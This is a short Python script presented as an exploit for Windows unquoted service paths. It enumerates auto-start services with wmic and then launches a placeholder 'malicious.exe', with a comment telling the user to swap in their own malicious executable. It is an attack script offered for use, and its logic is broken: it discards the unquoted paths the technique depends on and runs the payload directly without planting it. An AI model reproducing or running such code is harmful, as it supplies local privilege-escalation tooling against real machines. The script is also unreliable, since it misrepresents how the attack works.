import subprocess

def exploit_unquoted_service_path():
    command = "wmic service get name,pathname,startmode | findstr /i auto | findstr /i /v " + '"C:\\Windows\\"'
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    services = result.stdout.strip().split("\n")
    
    for service in services:
        service_name, _, path = service.strip().split(None, 2)
        if path.startswith('"') and path.endswith('"'):
            path = path[1:-1]
        else:
            continue

        if " " in path:
            path = path.split(" ", 1)[0]

        exploit_path = path + "\\malicious.exe"  # Replace with the path to your malicious executable
        subprocess.run(exploit_path, shell=True)

# Example usage
exploit_unquoted_service_path()